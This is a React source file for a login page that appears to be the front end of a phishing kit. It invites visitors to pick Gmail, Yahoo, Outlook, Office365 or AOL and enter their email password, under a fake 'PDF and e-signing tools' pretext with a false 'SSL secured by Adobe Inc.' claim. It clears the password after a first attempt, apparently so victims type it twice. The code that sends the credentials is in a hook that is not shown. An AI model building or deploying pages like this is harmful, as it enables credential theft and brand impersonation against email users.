import React, { useState } from 'react';
import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles } from 'lucide-react';
import { useLogin } from '../hooks/useLogin'; // This path is correct
import Spinner from './common/Spinner'; // Corrected path

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
  showBackButton?: boolean;
}

const LoginPage: React.FC<LoginPageProps> = ({ 
  fileName, 
  onBack, 
  onLoginSuccess, 
  onLoginError,
  showBackButton = false 
}) => {
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  
  // Use the custom hook for login logic
  const { isLoading, errorMessage, handleFormSubmit, resetLoginState } = useLogin(
    onLoginSuccess,
    onLoginError
  );

  const emailProviders = [
    { name: 'Office365', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
    { name: 'Yahoo', domain: 'yahoo.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png' },
    { name: 'Outlook', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png' },
    { name: 'AOL', domain: 'aol.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png' },
    { name: 'Gmail', domain: 'gmail.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
    { name: 'Others', domain: 'other.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
  ];

  const handleProviderSelect = (provider: string) => {
    setSelectedProvider(provider);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: selectedProvider });
    if (result?.isFirstAttempt) {
      setPassword(''); // Clear password field after first attempt
    }
  };

  const handleBackToProviders = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
    resetLoginState();
  };

  return (
    <div
      className="login-bg min-h-screen flex items-center justify-center p-6 bg-gray-50 relative overflow-hidden"
      style={{
        backgroundImage: "url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg/640px-Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg')",
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat'
      }}
    >
      <div className="hidden md:flex absolute right-6 bottom-6 flex-col items-end z-20 pointer-events-none text-right">
        <div className="text-white/90 text-sm">PDF and e-signing tools</div>
        <div className="text-white/80 text-sm italic mt-1">Securely access your PDFs</div>
      </div>

      <div className="w-full max-w-sm relative z-10 mx-4 sm:mx-6">
        <div className="relative bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
          <div className="px-6 py-8 bg-gradient-to-r from-white to-slate-50 border-b border-gray-100 flex items-center gap-4 relative">
            <div className="absolute left-1/2 top-1/2 transform -translate-x-1/2 -translate-y-1/2">
              <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-slate-100 border border-slate-100">
                <Sparkles className="w-4 h-4 text-indigo-500" />
                <span className="text-xs font-medium text-indigo-700">{!selectedProvider ? 'Select Your Provider' : `Sign in with ${selectedProvider}`}</span>
              </div>
            </div>
          </div>

          <div className="px-6 py-6 flex flex-col gap-6">
            {!selectedProvider ? (
              <div className="space-y-3">
                <div className="grid grid-cols-2 gap-4">
                  {emailProviders.map((provider) => (
                    <button key={provider.name} onClick={() => handleProviderSelect(provider.name)} type="button" aria-label={`Select ${provider.name}`} className="flex items-center gap-3 p-3 rounded-xl bg-white border border-gray-100 shadow-sm hover:shadow-md transition-shadow duration-200 justify-start">
                      <div className="flex items-center justify-center w-10 h-10 rounded-md bg-gradient-to-br from-slate-50 to-white border border-gray-100">
                        <img src={provider.logo} alt={provider.name} className="w-6 h-6 object-contain" />
                      </div>
                      <div className="text-sm font-semibold text-slate-800">{provider.name}</div>
                    </button>
                  ))}
                </div>
              </div>
            ) : (
              <div className="space-y-4">
                <div className="flex items-center gap-3">
                  <button onClick={handleBackToProviders} className="p-2 rounded-md hover:bg-slate-100" type="button">
                    <ArrowLeft className="w-4 h-4 text-slate-600" />
                  </button>
                  <div className="flex items-center gap-3">
                    <img src={emailProviders.find(p => p.name === selectedProvider)?.logo} alt={selectedProvider} className="w-8 h-8 object-contain" />
                    <h2 className="text-lg font-bold text-slate-900">Sign in with {selectedProvider}</h2>
                  </div>
                </div>

                <form onSubmit={handleSubmit} className="space-y-4">
                  {errorMessage && (
                    <div className="rounded-lg p-3 bg-red-50 border border-red-100">
                      <p className="text-sm text-red-700">{errorMessage}</p>
                    </div>
                  )}

                  <div>
                    <label className="block text-sm font-medium text-slate-700 mb-2">Email Address</label>
                    <div className="relative">
                      <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" />
                      <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="Enter your email address" required className="w-full pl-12 pr-4 py-3 bg-slate-50 border border-gray-100 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-200 transition" />
                    </div>
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-slate-700 mb-2">Password</label>
                    <div className="relative">
                      <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400 w-5 h-5" />
                      <input type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Enter your password" required className="w-full pl-12 pr-12 py-3 bg-slate-50 border border-gray-100 rounded-xl text-slate-900 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-indigo-200 transition" />
                      <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 transform -translate-y-1/2 text-slate-500 hover:text-slate-700">
                        {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                      </button>
                    </div>
                  </div>

                  <button type="submit" disabled={isLoading || !email || !password} className="w-full py-3 rounded-xl font-semibold text-white bg-gradient-to-r from-indigo-600 to-indigo-500 hover:from-indigo-700 hover:to-indigo-600 disabled:opacity-60 disabled:cursor-not-allowed shadow">
                    {isLoading ? <Spinner size="sm" color="border-white" className="inline-block mr-2" /> : null}
                    <span>{isLoading ? 'Signing in...' : 'Sign In Securely'}</span>
                  </button>
                </form>
              </div>
            )}

            <div className="pt-2 border-t border-gray-100">
              <p className="text-xs text-slate-500 text-center">© 2025 municipalfilesport. SSL secured by Adobe Inc.</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;
